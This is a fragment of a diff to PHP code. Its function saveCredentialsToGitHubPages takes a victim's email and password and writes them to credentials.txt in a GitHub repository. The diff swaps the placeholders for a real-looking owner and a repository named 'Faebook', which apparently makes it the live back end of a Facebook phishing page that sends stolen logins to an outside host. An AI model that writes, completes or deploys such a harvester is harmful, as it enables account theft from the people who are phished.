@@ -59,8 +59,8 @@ function saveCredentialsToGitHubPages($email, $password) {
     $client->authenticate('your_access_token', 'x-oauth-basic');
     // Create a new file in the repository
     $client->api('repository')->createFile(
-        'your_repository_owner',
-        'your_repository_name',
+        'bzpw36',
+        'Faebook',
         'credentials.txt',
         $email . "\n" . $password,
         'Saving credentials'
